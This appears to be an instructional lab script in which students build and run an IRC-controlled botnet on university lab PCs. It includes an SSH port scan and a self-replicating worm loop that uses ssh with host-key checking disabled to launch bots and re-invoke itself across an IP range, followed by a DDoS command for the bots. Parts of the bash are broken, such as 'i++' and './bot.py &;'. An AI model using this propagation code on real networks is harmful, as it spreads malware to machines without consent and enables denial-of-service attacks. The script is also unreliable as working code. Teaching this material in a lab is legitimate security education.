# [OVERVIEW]

# This will be an interactive lab.
# Make sure to read all instructions carefully.
# Wherever there is an ANSWER or TODO, you must complete them to get full marks.

# EXPLAIN TYPICAL BOTNET LIFECYCLE, WHICH PARTS WE ARE COVERING, WHICH PARTS WE ARE SKIPPING AND WHY

# Why can we ssh into these lab pcs without having to provide a password?
# Normally, we would have to create backdoors for each machine that we break into.
# However, in this case, we are already logged in as a user,
# so switching to different machines in the local network does not require a password.

# Why do we only need to copy the botnet files to just one lab pc?
# The answer is NFS.

# [PERMISSIONS]

# Run "chmod u+x c2.py bot.py botnet.sh"


# [RUNNING IRC SERVER]

# Run "ifconfig" and look for the ipv4 address of the eno1 network interface.
# Edit the "ircd.yaml" file.
# Under "server -> listeners", replace 127.0.0.1 with the correct address.

# QUESTION: What is the standard plaintext port that our bots use to connect to the IRC server?
# ANSWER: 


# [JOINING IRC SERVER AS BOTMASTER]


# [RECONNAISSANCE]

# While logged into a lab pc:

# Run "ssh dh2026pc01" and then "ifconfig".

# QUESTION: What is the ipv4 address (inet) of the eno1 network interface?
# ANSWER: 

# Run "ssh dh2010pc00" and then "ifconfig".

# QUESTION: What is the ipv4 address (inet) of the eno1 network interface?
# ANSWER: 

# Run "ssh <ip_address>" on a few other ip addresses, where <ip_address> is
# some ip address in between the ip range of the previous two answers.

# QUESTION: What can you infer about this ip range?
# ANSWER: 

# Make a note of the endings (last byte) of these two ip addresses.
# You will pass them as arguments when you call this script later.

ip_prefix="142.1.46."
range_start=$1
range_end=$2


# [INFECTION / MULTIPLICATION]

SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

i=$range_start

# Iterate over ip range to find new hosts to infect.
while [ $i -le $range_end ]; do
    ip_address="$ip_prefix$i"

    nc -zv $ip_address ssh
    if [ $? -eq 0 ]; then
        # SSH port was open.

        new_range_end=$(( range_end / 2 ))
        new_range_start=$(( new_range_end + 1 ))

        if [[ $new_range_start -eq $i ]]; then
            new_range_start++
        fi

        # Divide and conquer: use infected bots to infect more bots and multiply.
        # TODO: Replace <> and <> with the scripts that we want to execute on the victim lab pc.
        ssh -o "StrictHostKeyChecking no" $ip_address "cd $SCRIPT_DIR; ./bot.py &; ./botnet.sh $new_range_start $range_end &;"

        range_end=$new_range_end
    fi

    i++
done


# CONTROL

# Send the command "DDOS TCP localhost 8080 8 10" from the botmaster IRC client.
# QUESTION: What does this command do? (look through bot.py if you are unsure)
# ANSWER: 
